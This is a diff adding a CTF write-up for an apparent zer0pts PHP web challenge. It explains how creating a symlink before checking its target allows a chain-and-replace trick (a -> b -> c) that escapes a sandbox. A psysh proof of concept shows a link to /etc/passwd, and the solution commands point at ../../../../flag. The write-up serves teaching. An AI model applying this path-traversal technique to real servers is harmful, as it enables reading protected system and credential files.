@@ -1,0 +1,92 @@
+Restrictions
+	# Filename should not contain characters except for 0-9A-Za-z.
+	if (preg_match('/[^a-z0-9]/i', $name)) {
+        throw new Exception('invalid filename');
+    }
+
+    # When you create a symbolic link, the link target should not start with / or contain ..
+
+    if (strpos($path, "/") === 0) {
+        throw new Exception('invalid filepath (absolute path)');
+    } else if (strpos($path, "..") !== false) {
+        throw new Exception('invalid filepath (outside user-space)');
+    }
+
+Vulnerability
+	fs.php
+	```
+	/* Create a symbolic link */
+    @symlink($target, $this->root.$name);
+
+    /* This check ensures $target points to inside user-space */
+    try {
+        $this->validate_filepath(@readlink($this->root.$name));
+    } catch(Exception $e) {
+        /* Revert changes */
+        @unlink($this->root.$name);
+        throw $e;
+    }
+    ```
+
+    It checks the target path after a symbolic link is created
+
+
+When we make a symbolic chain like a -> b -> c
+
+	readlink('a') returns b and file_get_contents('a') returns the contents of c
+
+	PoC
+	```
+	$ psysh
+	Psy Shell v0.10.6 (PHP 7.2.24-0ubuntu0.18.04.7 — cli) by Justin Hileman
+	>>> symlink('c', 'b')
+	=> true
+	>>> symlink('b', 'a')
+	=> true
+	>>> file_put_contents('c', 'test')
+	=> 4
+	>>> 
+	>>> readlink('a')
+	=> "b"
+	```
+
+
+	In addition to that, when we remove c and try to replace a with new symlink, how does it work?
+	As the result below shows, a symlink named c that targets /etc/passwd is created, and symlink('a') still returns b.
+
+	```
+	>>> unlink('c')
+	=> true
+	>>> symlink('/etc/passwd', 'a')
+	=> true
+	>>> readlink('a')
+	=> "b"
+	>>> passthru('ls -la')
+	total 8
+	drwx------  2 st98 st98 4096 Mar  7 09:22 .
+	drwxrwxrwt 58 root root 4096 Mar  7 09:18 ..
+	lrwxrwxrwx  1 st98 st98    1 Mar  7 09:16 a -> b
+	lrwxrwxrwx  1 st98 st98    1 Mar  7 09:16 b -> c
+	lrwxrwxrwx  1 st98 st98   11 Mar  7 09:22 c -> /etc/passwd
+	=> null
+	```
+
+Steps
+	1. Make a symbolic link chain like a -> b -> c
+	2. Delete c
+	3. symlink('../../../../flag', 'a')
+
+================== Solution ==================
+
+pythnon solve.py
+
+
+Can do it manually on http://web.ctf.zer0pts.com:8001/ as well.
+```
+symlink('.', 'c')
+symlink('c', 'b')
+symlink('b', 'a')
+unlink('c')
+symlink('../../../../flag', 'a')
+```
+
